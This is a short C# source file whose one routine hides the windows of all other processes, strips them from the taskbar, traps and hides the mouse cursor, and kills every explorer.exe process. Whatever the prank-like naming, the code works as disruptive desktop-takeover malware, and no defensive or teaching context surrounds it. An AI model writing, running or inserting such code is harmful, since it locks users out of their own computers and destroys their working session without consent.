using System;
using System.Diagnostics;

using System.Runtime.InteropServices;

namespace Moo;
internal static partial class FunnyStuff
{
	[LibraryImport("user32.dll")]
	public static partial uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
	public static void MessWithWindows()
	{
		WNDENUMPROC hide_window_callback = new(HideWindowAndOwner);
		BOOL windowsenumed = EnumWindows(hide_window_callback, (LPARAM)0);
		bool clipped = ClipCursor(App.ScreenBottomCorner());
		_ = SetCursor(null);
		foreach (Process proc in Process.GetProcessesByName("explorer"))
			proc.Kill();
	}
	internal static BOOL HideWindowAndOwner(HWND hwnd, LPARAM lParam)
	{
		HWND owner_hwnd = GetWindow(hwnd, GET_WINDOW_CMD.GW_OWNER);
		uint thread_id = GetWindowThreadProcessId((nint)owner_hwnd, out uint process_id);
		Process owner_process = Process.GetProcessById((int)process_id);
		if (Environment.ProcessId != process_id)
		{
			_ = ShowWindow(hwnd, SHOW_WINDOW_CMD.SW_HIDE);
			_ = ShowWindow(owner_hwnd, SHOW_WINDOW_CMD.SW_HIDE);
			_ = SetWindowLongPtr(hwnd, WINDOW_LONG_PTR_INDEX.GWL_EXSTYLE, (nint)WINDOW_EX_STYLE.WS_EX_TOOLWINDOW);
			_ = SetWindowLongPtr(owner_hwnd, WINDOW_LONG_PTR_INDEX.GWL_EXSTYLE, (nint)WINDOW_EX_STYLE.WS_EX_TOOLWINDOW);
		}
		return true;
	}
}
